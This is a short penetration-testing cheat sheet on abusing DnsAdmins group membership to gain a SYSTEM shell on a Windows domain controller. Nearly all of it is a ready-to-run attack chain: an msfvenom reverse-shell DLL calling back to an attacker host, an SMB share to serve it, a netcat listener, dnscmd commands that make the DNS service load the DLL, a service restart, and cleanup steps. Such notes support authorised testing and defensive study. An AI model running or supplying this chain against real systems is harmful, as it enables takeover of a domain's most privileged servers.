---
icon: dial-low
---

# DNS Admins Abuse

#### Members can load a custom DLL into the DNS service which runs as SYSTEM on DC.

**Requirement:** Member of DnsAdmins group

```bash
# Step 1 — Linux: create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker-ip LPORT=443 -f dll -o pwn.dll

# Step 2 — Host DLL via SMB share
impacket-smbserver smbFolder $(pwd) -smb2support

# Step 3 — Listener
rlwrap -cAr nc -nlvp 443
```

```powershell
# Step 4 — Windows: configure DNS to load DLL
dnscmd.exe /config /serverlevelplugindll \\\\attacker-ip\\smbFolder\\pwn.dll

# Or
dnscmd dc01 /config /serverlevelplugindll \\\\attacker-ip\\smbFolder\\pwn.dll

# Step 5 — Restart DNS service
sc.exe stop dns
sc.exe start dns
# SYSTEM shell received
```

**Cleanup after:**

```bash
# Remove the DLL config to restore DNS
dnscmd dc01 /config /serverlevelplugindll 0
sc.exe stop dns
sc.exe start dns
```

***
